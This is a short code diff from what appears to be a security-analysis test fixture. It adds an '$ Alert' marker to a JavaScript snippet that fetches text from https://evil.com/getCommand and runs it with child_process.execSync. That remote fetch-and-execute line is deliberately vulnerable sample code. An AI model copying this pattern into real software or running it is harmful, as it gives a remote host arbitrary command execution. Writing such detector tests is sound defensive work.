@@ -3,6 +3,6 @@ let https = require("https"),
 
 https.get("https://evil.com/getCommand", res =>
     res.on("data", command => {
-        cp.execSync(command);
+        cp.execSync(command); // $ Alert
     })
 );
